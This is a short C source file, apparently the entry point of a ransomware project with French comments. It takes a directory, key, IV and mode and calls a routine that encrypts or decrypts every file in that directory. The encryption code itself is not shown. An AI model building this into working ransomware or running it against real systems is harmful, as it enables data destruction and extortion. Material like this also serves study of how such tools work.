#include <stdio.h>
#include <string.h>
#include "ransomware.h"

int main(int argc, char *argv[]) { 
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <directory> <key> <iv> <mode>\n", argv[0]);
        fprintf(stderr, "Mode: 0 pour chiffrer, 1 pour déchiffrer\n");
        return 1;
    }

    const char *directory = argv[1];
    unsigned char key[KEY_SIZE]; // 256 bits
    unsigned char iv[IV_SIZE];  // 128 bits

    // Copier la clé et le vecteur d'initialisation depuis les arguments
    strncpy((char *)key, argv[2], sizeof(key));
    strncpy((char *)iv, argv[3], sizeof(iv));

    // Récupérer le mode (0 pour chiffrer, 1 pour déchiffrer)
    int mode = atoi(argv[4]);

    // Vérifier que le mode est valide
    if (mode != 0 && mode != 1) {
        fprintf(stderr, "Erreur : mode invalide. Utilisez 0 pour chiffrer ou 1 pour déchiffrer.\n");
        return 1;
    }

    // Appeler la fonction pour lire et traiter les fichiers
    read_and_crypt_directory(directory, mode, key, iv);

    return 0;
}
